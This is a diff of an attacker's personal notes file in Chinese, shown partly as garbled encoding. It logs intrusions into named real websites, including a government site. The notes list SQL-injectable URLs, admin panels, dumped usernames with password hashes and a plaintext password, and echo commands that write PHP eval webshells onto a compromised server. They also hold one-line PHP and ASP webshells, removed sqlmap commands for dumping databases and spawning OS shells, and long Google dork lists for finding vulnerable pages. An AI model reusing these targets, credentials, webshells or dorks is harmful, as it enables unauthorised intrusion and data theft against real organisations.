@@ -1,6 +1,6 @@
 ///////////////////////////////////////////////////////
 http://www.bjsqlw.com/newshow.php?id=680      MySQL
-ºóÌ¨£ºhttp://www.bjsqlw.com/admin981/Login.php
+åå°ï¼šhttp://www.bjsqlw.com/admin981/Login.php
 +-------+----------------------------------+
 | name  | password                         |
 +-------+----------------------------------+
@@ -56,8 +56,8 @@ PORT     STATE    SERVICE
 the back-end DBMS is Oracle:
 http://www.hfjs.gov.cn/Dept/news.jsp?item_id=100605 XSS Attacks
 //////////////////////////////////////////////////////////////////////////
-http://dcsxwh.dcjy.net/OK.php Ğ¡Âí
-http://dcsxwh.dcjy.net/usercp_a.php ´óÂí
+http://dcsxwh.dcjy.net/OK.php å°é©¬
+http://dcsxwh.dcjy.net/usercp_a.php å¤§é©¬
 
 echo ^<?php eval($_POST[Eliot]); ?^> > C:\sxwh\includes\usercp_viewprofile.php
 echo ^<?php eval($_POST[Eliot]); ?^> > 
@@ -68,12 +68,12 @@ http://dcsxwh.dcjy.net/cat.php?cat_id=103 MySQL
 //////////////////////////////////////////////////////////////////////////
 http://www.jiannongtv.com/news_detail.asp?id=15 ACCESS
 //////////////////////////////////////////////////////////////////////////
-ºóÌ¨£ºhttp://www.tyhw.com/news/login.asp
+åå°ï¼šhttp://www.tyhw.com/news/login.asp
 http://www.tyhw.com/shownews.asp?newsid=24768 ACCESS
 
 www.tyhw.com/news/function/upload.asp
 
-/news/function/upload.asp£¬ĞĞ 124
+/news/function/upload.aspï¼Œè¡Œ 124
 
 +----------+--------+-----------+
 | name     | userid | pwd       |
@@ -112,9 +112,9 @@ User:
 | lj       | e96ed478dab8595a7dbda4cbcbee168f |
 +----------+----------------------------------+
 ljxx8_kdjeij
-Í¼Êé¹ÜÀíºóÌ¨£º
+å›¾ä¹¦ç®¡ç†åå°ï¼š
 http://www.dylj.cn/tsgl2/
-ÊµÑéÒÇÆ÷¹ÜÀíºóÌ¨£º
+å®éªŒä»ªå™¨ç®¡ç†åå°ï¼š
 http://www.dylj.cn/shiYanYiQi/index.php?action=9876sfi
 +----------+----------------------------------+
 | username | password                         |
@@ -168,7 +168,7 @@ admin3 lwx05189
 + 1 host(s) tested
 
 ///////////////////////////////////////////////////////////////////////////
-±±¾©°£²¨ÍĞË¹¿Æ¼¼ÓĞÏŞ¹«Ë¾
+åŒ—äº¬åŸƒæ³¢æ‰˜æ–¯ç§‘æŠ€æœ‰é™å…¬å¸
 
 http://www.emotes.com.cn/uploadfile/file/OK.asp;.htm
 http://www.emotes.com.cn/uploadfile/file/20160602/20160602073675987598.rar
@@ -267,39 +267,23 @@ database management system users password hashes:
         header: 0x0100
         salt: 5ce5d040
         mixedcase: 99585b0985d71588c00cc540df95b37d8bf0b026
-//////////////////////////////////////////////////////////////////////////
-python sqlmap.py -u ×¢ÈëµØÖ· --is-dba   ÅĞ¶Ïµ±Ç°ÓÃ»§ÊÇ²»ÊÇDBA
-python sqlmap.py -u ×¢ÈëµØÖ· --users    ²é¿´µ±Ç°ÓÃ»§
-python sqlmap.py -u ×¢ÈëµØÖ· --passwords ²é¿´ÃÜÂë
-python sqlmap.py -u ×¢ÈëµØÖ· --privileges ²é¿´È¨ÏŞ
-python sqlmap.py -u ×¢ÈëµØÖ· --os-shell  Ğ´web shell
---dbs
-±¬¿â
--D ¿â --tables
-±¬±í
--D ¿â -T ±í --columns
-±¬×Ö¶Î
--D ¿â -T ±í -C ×Ö¶Î --dump
-ÍÑ¿ã
--D ¿â -T ±í -C ×Ö¶Î --dump --threads=10 --start=1 --stop=10
-///////////////////////
 awvs
 skipfish
 ///////////////////////
-Ğ¡Âí£º
+å°é©¬ï¼š
 <?php @eval($_POST['c']);?>
 <%execute request("e")%>
 ///////////////////////
-×¢Èëµã£º
+æ³¨å…¥ç‚¹ï¼š
 inurl:asp?id=
 inurl:Article_Print.asp?
-inurl:EnCompHonorBig.asp?id=Ëæ±ã¼Ó¸öÊı×Ö
-inurl:showproduct.asp?id=Ëæ±ã¼Ó¸öÊı×Ö 
+inurl:EnCompHonorBig.asp?id=éšä¾¿åŠ ä¸ªæ•°å­—
+inurl:showproduct.asp?id=éšä¾¿åŠ ä¸ªæ•°å­— 
 inurl:ManageLogin.asp
-inurl:EnCompHonorBig.asp?id= Ëæ±ã¼Ó¸öÊı×Ö
-inurl: (asp?=Êı×Ö) inurl: (php?=Êı×Ö)
+inurl:EnCompHonorBig.asp?id= éšä¾¿åŠ ä¸ªæ•°å­—
+inurl: (asp?=æ•°å­—) inurl: (php?=æ•°å­—)
 inurl:Article_Print.asp?
-site Ö¸¶¨ÍøÕ¾ inurl:Article_Print.asp?
+site æŒ‡å®šç½‘ç«™ inurl:Article_Print.asp?
 inurl:NewsInfo.asp?id=
 inurl:ShowNew.asp?Id=
 inurl:ShowNews.asp?Id=
@@ -453,20 +437,20 @@ inurl:art.php?idm=
 inurl:title.php?id=
 ====================
 inurl:CompHonorBig.asp?id=
-inurl:articleshow.asp?articleid=ÈÎÒâÊı×Ö
+inurl:articleshow.asp?articleid=ä»»æ„æ•°å­—
 inurl:showproduct.asp?id=
 inurl:ManageLogin.asp 
 inurl:EnCompHonorBig.asp?id= 
-inurl: (asp?=Êı×Ö) inurl: (php?=Êı×Ö)
+inurl: (asp?=æ•°å­—) inurl: (php?=æ•°å­—)
 inurl:Article_Print.asp?
 site inurl:Article_Print.asp?
 inurl:Article_Print.asp?
-inurl:EnCompHonorBig.asp?id=Ëæ±ã¼Ó¸öÊı×Ö
-inurl:showproduct.asp?id=Ëæ±ã¼Ó¸öÊı×Ö 
+inurl:EnCompHonorBig.asp?id=éšä¾¿åŠ ä¸ªæ•°å­—
+inurl:showproduct.asp?id=éšä¾¿åŠ ä¸ªæ•°å­— 
 inurl:ManageLogin.asp
-inurl:EnCompHonorBig.asp?id= Ëæ±ã¼Ó¸öÊı×Ö
-inurl: asp?=Êı×Ö 
-inurl: php?=Êı×Ö
+inurl:EnCompHonorBig.asp?id= éšä¾¿åŠ ä¸ªæ•°å­—
+inurl: asp?=æ•°å­— 
+inurl: php?=æ•°å­—
 inurl:Article_Print.asp?
 site http://www.xmevs.com/ inurl:Article_Print.asp?
 inurl:NewsInfo.asp?id=
